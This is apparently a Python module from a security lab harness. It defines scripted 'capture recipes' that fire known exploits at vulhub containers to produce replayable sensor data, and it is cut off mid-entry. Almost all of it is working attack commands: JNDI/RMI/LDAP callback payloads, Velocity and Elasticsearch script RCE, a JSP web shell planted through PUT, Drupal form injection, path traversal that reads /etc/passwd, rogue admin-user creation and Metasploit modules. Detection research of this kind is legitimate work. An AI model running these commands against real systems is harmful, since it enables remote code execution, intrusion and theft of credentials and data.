"""Deterministic red-data capture recipes for replayable lab evidence.

These recipes are deliberately separate from model-directed red evaluation.
They generate a known attack transaction and require a machine-readable success
marker before the resulting sensor data can be considered for certification.
The marker is an execution control only; it is never added to observed target
telemetry.  Capture validity remains the responsibility of the independent
scenario signal validator.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class CaptureRecipe:
    command: str
    success_pattern: str = r"(?m)^__PORTAL_RECIPE_OK__$"
    postcondition_command: str = ""
    postcondition_pattern: str = ""
    host_setup_command: str = ""
    host_setup_pattern: str = ""
    host_cleanup_command: str = ""


CAPTURE_RECIPES: dict[str, CaptureRecipe] = {
    "vuln_activemq_deserial": CaptureRecipe(
        command=r"""out=$(python3 /vulhub/activemq/CVE-2023-46604/poc.py "$TARGET_HOST" "$TARGET_PORT" "http://$TARGET_HOST:16666/poc.xml" 2>&1); printf '%s\n' "$out"; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/activeMQ-RCE-success && echo PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success",
        host_setup_command=r"""sh -lc 'test ! -f /tmp/portal-activemq-http.pid || kill $(cat /tmp/portal-activemq-http.pid) 2>/dev/null || true; cd /opt/vulhub/activemq/CVE-2023-46604; nohup python3 -m http.server 16666 --bind 0.0.0.0 >/tmp/portal-activemq-http.log 2>&1 </dev/null & echo $! >/tmp/portal-activemq-http.pid; sleep 1; test -s /tmp/portal-activemq-http.pid && echo PORTAL_HOST_SETUP:activemq-http' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:activemq-http",
        host_cleanup_command=r"""sh -lc 'test ! -f /tmp/portal-activemq-http.pid || kill $(cat /tmp/portal-activemq-http.pid) 2>/dev/null || true; rm -f /tmp/portal-activemq-http.pid' """,
    ),
    "vuln_fastjson_rce": CaptureRecipe(
        command=r"""payload='{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://$TARGET_HOST:16668/Exploit","autoCommit":true}}'; code=$(curl -sS --max-time 30 -o /tmp/portal-fastjson-response -w '%{http_code}' -X POST "http://$TARGET_HOST:$TARGET_PORT/" -H 'Content-Type: application/json' --data "$payload" || true); printf 'HTTP=%s\n' "$code"; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r"""sh -lc 'for i in 1 2 3 4 5; do test -s /tmp/portal-fastjson-rmi.log && { echo PORTAL_TARGET_POSTCONDITION:fastjson-rmi-callback; exit 0; }; sleep 1; done; exit 1' """,
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:fastjson-rmi-callback",
        host_setup_command=r"""sh -lc 'test ! -f /tmp/portal-fastjson-rmi.pid || kill $(cat /tmp/portal-fastjson-rmi.pid) 2>/dev/null || true; : >/tmp/portal-fastjson-rmi.log; nohup timeout 120 nc -l 16668 >/tmp/portal-fastjson-rmi.log 2>&1 </dev/null & echo $! >/tmp/portal-fastjson-rmi.pid; sleep 1; test -s /tmp/portal-fastjson-rmi.pid && echo PORTAL_HOST_SETUP:fastjson-rmi' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:fastjson-rmi",
        host_cleanup_command=r"""sh -lc 'test ! -f /tmp/portal-fastjson-rmi.pid || kill $(cat /tmp/portal-fastjson-rmi.pid) 2>/dev/null || true; rm -f /tmp/portal-fastjson-rmi.pid' """,
    ),
    "vuln_weblogic_rce": CaptureRecipe(
        command=r"""out=$(python3 /opt/POC_CVE-2023-21839/CVE-2023-21839.py -ip "$TARGET_HOST" -p "$TARGET_PORT" -l "ldap://$TARGET_HOST:16667/Exploit" 2>&1); printf '%s\n' "$out"; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r"""sh -lc 'for i in 1 2 3 4 5; do test -s /tmp/portal-weblogic-ldap.log && { echo PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback; exit 0; }; sleep 1; done; exit 1' """,
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback",
        host_setup_command=r"""sh -lc 'test ! -f /tmp/portal-weblogic-ldap.pid || kill $(cat /tmp/portal-weblogic-ldap.pid) 2>/dev/null || true; : >/tmp/portal-weblogic-ldap.log; nohup timeout 120 nc -l 16667 >/tmp/portal-weblogic-ldap.log 2>&1 </dev/null & echo $! >/tmp/portal-weblogic-ldap.pid; sleep 1; test -s /tmp/portal-weblogic-ldap.pid && echo PORTAL_HOST_SETUP:weblogic-ldap' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:weblogic-ldap",
        host_cleanup_command=r"""sh -lc 'test ! -f /tmp/portal-weblogic-ldap.pid || kill $(cat /tmp/portal-weblogic-ldap.pid) 2>/dev/null || true; rm -f /tmp/portal-weblogic-ldap.pid' """,
    ),
    "vuln_laravel_rce": CaptureRecipe(
        command=r"""out=$(msfconsole -q -x "use exploit/multi/php/ignition_laravel_debug_rce; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-laravel-proof; check; run; exit -y" 2>&1); printf '%s\n' "$out" | tail -100; printf '%s' "$out" | grep -q 'target appears to be vulnerable' && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-laravel-proof && echo PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof",
    ),
    "vuln_wordpress_rce": CaptureRecipe(
        command=r"""host='target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}portal-wordpress-proof}} null)'; curl -sS --max-time 30 -H "Host: $host" -X POST "http://$TARGET_HOST:$TARGET_PORT/wp-login.php?action=lostpassword" --data 'wp-submit=Get+New+Password&redirect_to=&user_login=admin' >/dev/null; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-wordpress-proof && echo PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof",
        host_setup_command=r"""sh -lc 'base=http://127.0.0.1:$TARGET_PORT; host=$TARGET_HOST:$TARGET_PORT; for i in $(seq 1 30); do page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-admin/install.php" 2>/dev/null || true); test -n "$page" && break; sleep 2; done; if printf "%s" "$page" | grep -q "language-chooser"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=1" -d "language=" >/dev/null; fi; page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php"); if ! printf "%s" "$page" | grep -q "user_login"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=2" --data-urlencode "weblog_title=PortalLab" --data-urlencode "user_name=admin" --data-urlencode "admin_password=PortalLab1!" --data-urlencode "admin_password2=PortalLab1!" --data-urlencode "admin_email=portal@example.invalid" --data-urlencode "blog_public=0" --data-urlencode "Submit=Install WordPress" >/dev/null; fi; curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php" | grep -q "user_login" && echo PORTAL_HOST_SETUP:wordpress-installed' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:wordpress-installed",
    ),
    # vuln_confluence_rce has no recipe: found live 2026-07-31 -- the exploit
    # endpoint is behind Confluence's global setup filter, and the vulhub
    # README is explicit that clearing setup requires "a Confluence Server
    # test certificate from Atlassian" (a real license key issued by an
    # external third party). That can't be scripted into a deterministic,
    # offline, replayable host_setup_command the way a local SQLite/MySQL
    # install can. See config/security_corpus.yaml's
    # scenario_scope.excluded_from_lab_replay -- this scenario is classified
    # as theory, not a backed lab exercise, for the same reason as the
    # generic web_* entries there.
    "vuln_drupal_rce": CaptureRecipe(
        # A fresh drupal/CVE-2018-7600 container serves only /core/install.php
        # until the installer wizard is completed (found live 2026-07-31: the
        # exploit request always fell through to a "Redirecting to
        # /core/install.php" body, never `id`'s output, regardless of payload
        # correctness). host_setup_command drives the standard-profile/sqlite
        # install wizard end to end (profile select -> db config -> batch
        # install poll -> site configure) before the exploit ever runs.
        command=r"""out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data-urlencode 'form_id=user_register_form' --data-urlencode '_drupal_ajax=1' --data-urlencode 'mail[#post_render][]=exec' --data-urlencode 'mail[#type]=markup' --data-urlencode 'mail[#markup]=id'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__""",
        host_setup_command=r"""sh -lc '
base=http://127.0.0.1:$TARGET_PORT
host=$TARGET_HOST:$TARGET_PORT
for i in $(seq 1 30); do code=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" -H "Host: $host" "$base/" 2>/dev/null || true); test -n "$code" && test "$code" != "000" && break; sleep 2; done
front=$(curl -sS -m 10 -H "Host: $host" "$base/")
if printf "%s" "$front" | grep -q "core/install.php"; then
  jar=/tmp/portal-drupal.cookies; rm -f "$jar"
  page=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/core/install.php?langcode=en")
  fbid=$(printf "%s" "$page" | grep -o "form_build_id\" value=\"[^\"]*\"" | head -1 | sed "s/.*value=\"//;s/\"//")
  page=$(curl -sS -m 10 -b "$jar" -c "$jar" -L -H "Host: $host" --data-urlencode "form_build_id=$fbid" --data-urlencode "form_id=install_select_profile_form" --data-urlencode "profile=standard" --data-urlencode "op=Save and continue" "$base/core/install.php?langcode=en")
  fbid=$(printf "%s" "$page" | grep -o "form_build_id\" value=\"[^\"]*\"" | head -1 | sed "s/.*value=\"//;s/\"//")
  page=$(curl -sS -m 10 -b "$jar" -c "$jar" -L -H "Host: $host" --data-urlencode "driver=sqlite" --data-urlencode "sqlite[database]=sites/default/files/.sqlite/db.sqlite" --data-urlencode "form_build_id=$fbid" --data-urlencode "form_id=install_settings_form" --data-urlencode "op=Save and continue" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard")
  for i in $(seq 1 40); do
    page=$(curl -sS -m 10 -b "$jar" -c "$jar" -H "Host: $host" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard&id=1&op=do_nojs")
    printf "%s" "$page" | grep -q "100%" && { page=$(curl -sS -m 10 -b "$jar" -c "$jar" -L -H "Host: $host" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard&id=1&op=finished"); break; }
    sleep 1
  done
  fbid=$(printf "%s" "$page" | grep -o "form_build_id\" value=\"[^\"]*\"" | head -1 | sed "s/.*value=\"//;s/\"//")
  curl -sS -m 15 -b "$jar" -c "$jar" -L -H "Host: $host" --data-urlencode "site_name=Portal Lab" --data-urlencode "site_mail=portal@example.invalid" --data-urlencode "account[name]=admin" --data-urlencode "account[mail]=portal@example.invalid" --data-urlencode "account[pass][pass1]=PortalLab1!" --data-urlencode "account[pass][pass2]=PortalLab1!" --data-urlencode "date_default_timezone=UTC" --data-urlencode "site_default_country=US" --data-urlencode "enable_update_status_module=1" --data-urlencode "form_build_id=$fbid" --data-urlencode "form_id=install_configure_form" --data-urlencode "op=Save and continue" "$base/core/install.php?rewrite=ok&langcode=en&profile=standard" >/dev/null
fi
front=$(curl -sS -m 10 -H "Host: $host" "$base/")
printf "%s" "$front" | grep -q "core/install.php" || echo PORTAL_HOST_SETUP:drupal-installed
' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:drupal-installed",
    ),
    "vuln_solr_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT/solr"; cores=$(curl -sS --max-time 30 "$base/admin/cores?wt=json"); core=$(printf '%s' "$cores" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(next(iter(d["status"])))'); test -n "$core" || exit 1; curl -sS --max-time 30 -X POST "$base/$core/config" -H 'Content-Type: application/json' --data '{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}' >/dev/null; tpl='%23set($x=%27%27)%23set($rt=$x.class.forName(%27java.lang.Runtime%27))%23set($chr=$x.class.forName(%27java.lang.Character%27))%23set($str=$x.class.forName(%27java.lang.String%27))%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'; out=$(curl -g -sS --max-time 30 "$base/$core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=$tpl"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_grafana_lfi": CaptureRecipe(
        command=r"""out=$(curl -sS --path-as-is --max-time 30 "http://$TARGET_HOST:$TARGET_PORT/public/plugins/alertlist/../../../../../../../../etc/passwd"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_tomcat_deploy": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; jsp='<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec("id"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){out.println(l);} %>'; code=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X PUT --data-binary "$jsp" "$base/portal-proof.jsp/"); out=$(curl -sS --max-time 30 "$base/portal-proof.jsp"); printf 'PUT=%s\n%s\n' "$code" "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_couchdb_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; user="portalproof$(date +%s)"; body=$(printf '{"type":"user","name":"%s","roles":["_admin"],"roles":[],"password":"portal-proof"}' "$user"); created=$(curl -sS --max-time 30 -X PUT "$base/_users/org.couchdb.user:$user" -H 'Content-Type: application/json' --data "$body"); auth=$(printf '%s' "$user:portal-proof" | base64 | tr -d '\n'); verified=$(curl -sS --max-time 30 -H "Authorization: Basic $auth" "$base/_all_dbs"); printf '%s\n%s\n' "$created" "$verified"; printf '%s' "$created" | grep -q '"ok":true' && printf '%s' "$verified" | grep -q '_users' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_elasticsearch_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; curl -sS --max-time 30 -X POST "$base/website/blog/" -H 'Content-Type: application/json' --data '{"name":"portal-proof"}' >/dev/null; curl -sS --max-time 30 -X POST "$base/_refresh" >/dev/null; out=$(curl -sS --max-time 30 -X POST "$base/_search?pretty" -H 'Content-Type: application/json' --data '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_redis_unauth": CaptureRecipe(
        command=r"""out=$(redis-cli -h "$TARGET_HOST" -p "$TARGET_PORT" INFO server 2>&1); cfg=$(redis-cli -h "$TARGET_HOST" -p "$TARGET_PORT" CONFIG GET dir 2>&1); printf '%s\n%s\n' "$out" "$cfg"; printf '%s' "$out" | grep -q 'redis_version:' && printf '%s' "$cfg" | grep -q '/data' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_nacos_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT/nacos"; user=portalproof; listed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=10"); created=$(curl -sS --max-time 30 -X POST -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?username=$user&password=portalproof"); confirmed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=20"); login=$(curl -sS --max-time 30 -X POST "$base/v1/auth/users/login?username=nacos&password=nacos"); printf '%s\n%s\n%s\n%s\n' "$listed" "$created" "$confirmed" "$login"; printf '%s' "$created" | grep -q 'create user ok' && printf '%s' "$confirmed" | grep -q 'portalproof' && printf '%s' "$login" | grep -Eq 'accessToken|globalAdmin' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_gitea_rce": CaptureRecipe(
        # The original recipe POSTed the LFS pointer registration and grepped
        # ITS response for /etc/passwd -- found live 2026-07-31: the traversal
        # proof only ever appears in a SEPARATE follow-up GET against the
        # objects/<mangled-oid>/sth download route (confirmed against the
        # vulhub README and a live capture: root:x:0:0: never appears in the
        # POST response, only the GET). The POST also 401s without LFS basic
        # auth against a real (non-placeholder) repo/user, and the repo/user
        # do not exist until host_setup_command creates them, which itself
        # needs an install-wizard pass + a `docker compose restart` (Gitea
        # 1.4's install handler restarts its own process mid-request and never
        # completes admin-account creation -- "admin" is also a reserved
        # username -- so setup registers a normal user post-restart instead).
        command=r"""out1=$(curl -sS --max-time 20 -u portaluser:PortalLab1! -X POST "http://$TARGET_HOST:$TARGET_PORT/portaluser/repo.git/info/lfs/objects" -H 'Accept: application/vnd.git-lfs+json' -H 'Content-Type: application/json' --data '{"Oid":"....../../../etc/passwd","Size":1000000,"User":"a","Password":"a","Repo":"a","Authorization":"a"}'); printf 'POST=%s\n' "$out1"; out2=$(curl -sS --max-time 20 --path-as-is -u portaluser:PortalLab1! "http://$TARGET_HOST:$TARGET_PORT/portaluser/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth" 2>&1); printf 'GET=%s\n' "$out2"; printf '%s' "$out2" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__""",
        host_setup_command=r"""sh -lc '
base=http://127.0.0.1:$TARGET_PORT
host=$TARGET_HOST:$TARGET_PORT
for i in $(seq 1 30); do code=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" -H "Host: $host" "$base/" 2>/dev/null || true); test "$code" = "200" -o "$code" = "302" && break; sleep 2; done
jar=/tmp/portal-gitea.cookies; rm -f "$jar"
front=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/")
if printf "%s" "$front" | grep -q "/install"; then
  page=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/install")
  csrf=$(printf "%s" "$page" | grep -o "_csrf\" content=\"[^\"]*\"" | head -1 | sed "s/.*content=\"//;s/\"//")
  curl -sS -m 15 -b "$jar" -c "$jar" -H "Host: $host" -X POST "$base/install" --data-urlencode "_csrf=$csrf" --data-urlencode "db_type=SQLite3" --data-urlencode "db_path=/data/gitea/gitea.db" --data-urlencode "app_name=Gitea: Git with a cup of tea" --data-urlencode "repo_root_path=/data/git/repositories" --data-urlencode "lfs_root_path=/data/git/lfs" --data-urlencode "run_user=git" --data-urlencode "domain=$TARGET_HOST" --data-urlencode "ssh_port=22" --data-urlencode "http_port=$TARGET_PORT" --data-urlencode "app_url=http://$host/" --data-urlencode "log_root_path=/data/gitea/log" --data-urlencode "register_confirm=off" --data-urlencode "mail_notify=off" --data-urlencode "offline_mode=on" --data-urlencode "admin_name=portaladmin" --data-urlencode "admin_passwd=PortalLab1!" --data-urlencode "admin_confirm_passwd=PortalLab1!" --data-urlencode "admin_email=admin@example.invalid" >/dev/null 2>&1
  docker compose -f /opt/vulhub/gitea/1.4-rce/docker-compose.yml restart >/dev/null 2>&1
  for i in $(seq 1 30); do code=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" -H "Host: $host" "$base/" 2>/dev/null || true); test "$code" = "200" && break; sleep 2; done
fi
rm -f "$jar"
page=$(curl -sS -m 10 -c "$jar" -H "Host: $host" "$base/user/sign_up")
csrf=$(printf "%s" "$page" | grep -o "_csrf\" content=\"[^\"]*\"" | head -1 | sed "s/.*content=\"//;s/\"//")
curl -sS -m 15 -b "$jar" -c "$jar" -H "Host: $host" -X POST "$base/user/sign_up" --data-urlencode "_csrf=$csrf" --data-urlencode "user_name=portaluser" --data-urlencode "email=portaluser@example.invalid" --data-urlencode "password=PortalLab1!" --data-urlencode "retype=PortalLab1!" >/dev/null 2>&1
repo=$(curl -sS -m 15 -u portaluser:PortalLab1! -H "Host: $host" -X POST "$base/api/v1/user/repos" -H "Content-Type: application/json" --data "{\"name\":\"repo\",\"auto_init\":false,\"private\":false}")
printf "%s" "$repo" | grep -q "\"full_name\":\"portaluser/repo\"" && echo PORTAL_HOST_SETUP:gitea-repo-ready
' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:gitea-repo-ready",
    ),
    "vuln_joomla_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 30 "http://$TARGET_HOST:$TARGET_PORT/api/index.php/v1/config/application?public=true"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '"(password|db|user)"' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_nexus_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --path-as-is --max-time 30 "http://$TARGET_HOST:$TARGET_PORT/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_django_sqli": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; out=$(curl -sS --max-time 30 --get "$base/" --data-urlencode "date=xxxx'xxxx"); printf '%s\n' "$out" | grep -Eim 5 'syntax error|database error|programmingerror|unterminated'; printf '%s' "$out" | grep -Eqi 'syntax error|database error|programmingerror|unterminated' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_thinkphp_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/index.php?s=captcha" --data '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'); printf '%s\n' "$out" | grep -Em 5 'uid=[0-9]+\('; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_rails_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 30 -H 'Accept: ../../../../../../../../etc/passwd{{' "http://$TARGET_HOST:$TARGET_PORT/robots"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_phpmyadmin_rce": CaptureRecipe(
        # phpMyAdmin's own container answers HTTP as soon as apache starts, well
        # before its linked mysql:5.5 sidecar finishes initializing (random-root
        # password generation + first-boot schema init takes several seconds) --
        # found live 2026-07-31: hitting the exploit right after cmd_up's plain
        # TCP-reachability check landed on phpMyAdmin's "Access denied!" config-auth
        # failure page every time, not the SQL console. host_setup_command polls
        # until the config-mode auto-login actually succeeds before the exploit runs.
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; curl -sS --max-time 30 -c /tmp/portal-pma.cookies "$base/" >/dev/null; out=$(curl -sS --path-as-is --max-time 30 -b /tmp/portal-pma.cookies "$base/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"); printf '%s\n' "$out" | grep -Em 5 'root:x:0:0:'; printf '%s' "$out" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__""",
        host_setup_command=r"""sh -lc '
base=http://127.0.0.1:$TARGET_PORT
host=$TARGET_HOST:$TARGET_PORT
for i in $(seq 1 40); do
  out=$(curl -sS -m 5 -H "Host: $host" "$base/" 2>/dev/null || true)
  printf "%s" "$out" | grep -qi "Access denied" || { printf "%s" "$out" | grep -qi "phpMyAdmin" && { echo PORTAL_HOST_SETUP:phpmyadmin-ready; exit 0; }; }
  sleep 3
done
exit 1' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:phpmyadmin-ready",
    ),
    "vuln_nginx_lfi": CaptureRecipe(
        command=r"""out=$(python3 /vulhub/nginx/CVE-2017-7529/poc.py "http://$TARGET_HOST:$TARGET_PORT/" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'KEY:|HTTP/1\.[01] 200|Content-Type:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_zabbix_rce": CaptureRecipe(
        command=r"""url="http://$TARGET_HOST:$TARGET_PORT/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml%280%2Cconcat%280xa%2Cuser%28%29%29%2C0%29"; out=''; for i in 1 2 3 4 5 6 7 8 9 10; do out=$(curl -sS --max-time 30 "$url"); printf '%s' "$out" | grep -Eqi 'XPATH syntax error|root@|zabbix@' && break; sleep 2; done; printf '%s\n' "$out" | grep -Eim 5 'XPATH syntax error|root@|zabbix@'; printf '%s' "$out" | grep -Eqi 'XPATH syntax error|root@|zabbix@' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_spring_actuator": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; sed "s#http://your-ip:8080#$base#" /vulhub/spring/CVE-2018-1270/exploit.py >/tmp/portal-spring-exploit.py; out=$(python3 /tmp/portal-spring-exploit.py 2>&1); printf '%s\n' "$out"; test "$(printf '%s' "$out" | grep -c 'data success')" -ge 3 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/success && echo PORTAL_TARGET_POSTCONDITION:spring-rce:/tmp/success'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:spring-rce:/tmp/success",
    ),
    "vuln_gitlab_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; page=''; for i in $(seq 1 48); do page=$(curl -sS --max-time 10 "$base/users/sign_in" 2>/dev/null || true); printf '%s' "$page" | grep -q 'csrf-token' && break; sleep 5; done; printf '%s' "$page" | grep -q 'csrf-token' || exit 1; out=$(python3 /vulhub/gitlab/CVE-2021-22205/poc.py "$base" 'touch /tmp/portal-gitlab-proof' 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -q 'finish test' && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-gitlab-proof && echo PORTAL_TARGET_POSTCONDITION:gitlab-rce:/tmp/portal-gitlab-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:gitlab-rce:/tmp/portal-gitlab-proof",
    ),
    "vuln_dubbo_rce": CaptureRecipe(
        command=r"""java --add-opens java.base/java.util=ALL-UNNAMED -jar /opt/ysoserial/ysoserial.jar CommonsCollections6 'touch /tmp/portal-dubbo-proof' >/tmp/portal-dubbo.poc 2>/dev/null; test -s /tmp/portal-dubbo.poc || exit 1; code=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X POST --data-binary @/tmp/portal-dubbo.poc "http://$TARGET_HOST:$TARGET_PORT/org.vulhub.api.CalcService"); printf 'HTTP=%s\n' "$code"; test "$code" != 000 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-dubbo-proof && echo PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof",
    ),
    "vuln_shiro_deserial": CaptureRecipe(
        command=r"""msfconsole -q -x "use exploit/multi/http/shiro_rememberme_v124_deserialize; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set JAVA_GADGET_CHAIN CommonsBeanutils1; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-shiro-proof; run; exit -y" 2>&1 | tail -80; test "${PIPESTATUS:-0}" != 1 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-shiro-proof && echo PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof'"''',
